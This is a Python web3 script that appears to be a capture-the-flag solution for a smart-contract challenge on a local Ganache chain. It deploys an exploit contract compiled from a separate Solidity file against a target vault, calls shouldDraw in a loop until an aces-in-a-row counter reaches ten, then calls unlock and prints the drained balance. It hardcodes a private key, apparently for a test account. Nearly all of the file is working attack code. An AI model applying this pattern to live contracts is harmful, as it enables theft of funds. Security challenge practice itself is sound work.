import json
from web3 import Web3
from solcx import compile_source, install_solc
from time import sleep
ACCOUNT_ADDR="0xc6560b90Ed93a1e4FaC8C6975B23630FAB2D1F1c"
ACCOUNT_PK="0xa5b754ab9d404ee28c2c3123ab7fce024a21230c35d699848409ff087b31f37b"
CONTRACT="0xA905307a042390c50D29Cc15B966CE98Ed769483"

install_solc("0.8.0")

with open("exploit.sol", "r") as file:
    contract_source_code = file.read()

compiled_sol = compile_source(
    contract_source_code,
    output_values=["abi", "bin"],
    solc_version="0.8.0",
)

vault_contract_id, vault_contract_interface = compiled_sol.popitem()
contract_id, contract_interface = compiled_sol.popitem()
abi = contract_interface["abi"]
bytecode = contract_interface["bin"]

ganache_url = "http://localhost:50007"
web3 = Web3(Web3.HTTPProvider(ganache_url))

account = web3.eth.account.from_key(ACCOUNT_PK)
contract = web3.eth.contract(address=CONTRACT, abi=vault_contract_interface["abi"])
if web3.is_connected():
    print("Connected to Ethereum node")
else:
    print("Failed to connect")

def deploy_exploit():
    nonce = web3.eth.get_transaction_count(account.address)

    contract = web3.eth.contract(abi=abi, bytecode=bytecode)
    tx = contract.constructor(CONTRACT).build_transaction({
        'chainId': 31337,
        'gas': 7000000,
        'gasPrice': web3.to_wei('1', 'gwei'),
        'nonce': nonce,
    })


    signed_tx = web3.eth.account.sign_transaction(tx, ACCOUNT_PK)
    
    tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Contract deployed at address: {tx_receipt.contractAddress}")
    return tx_receipt.contractAddress

def shouldDraw(c):
    nonce = web3.eth.get_transaction_count(account.address)
    tx = c.functions.shouldDraw().build_transaction({
        'chainId': 31337,
        'gas': 1000000,
        'gasPrice': web3.to_wei('1', 'gwei'),
        'nonce': nonce,
        'value': web3.to_wei(0.02, 'ether')
    })

    signed_tx = web3.eth.account.sign_transaction(tx, ACCOUNT_PK)
    try:
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    except:
        print("Did not go through")
        
def getacesInRows(c):
    wins = c.functions.getacesInRows().call()
    print(wins)
    return wins
def unlock(c):
    nonce = web3.eth.get_transaction_count(account.address)
    tx = c.functions.unlock().build_transaction({
        'chainId': 31337,
        'gas': 1000000,
        'gasPrice': web3.to_wei('1', 'gwei'),
        'nonce': nonce,
        'value': web3.to_wei(0.2, 'ether')
    })

    signed_tx = web3.eth.account.sign_transaction(tx, ACCOUNT_PK)

    tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
        
    print(tx_receipt)

exploit_address = deploy_exploit()
exploit_contract = web3.eth.contract(address=exploit_address, abi=contract_interface["abi"])

while getacesInRows(exploit_contract) < 10:
    shouldDraw(exploit_contract)
unlock(exploit_contract)
print("Balance:", web3.from_wei(web3.eth.get_balance(account.address), 'ether'), 'ether')


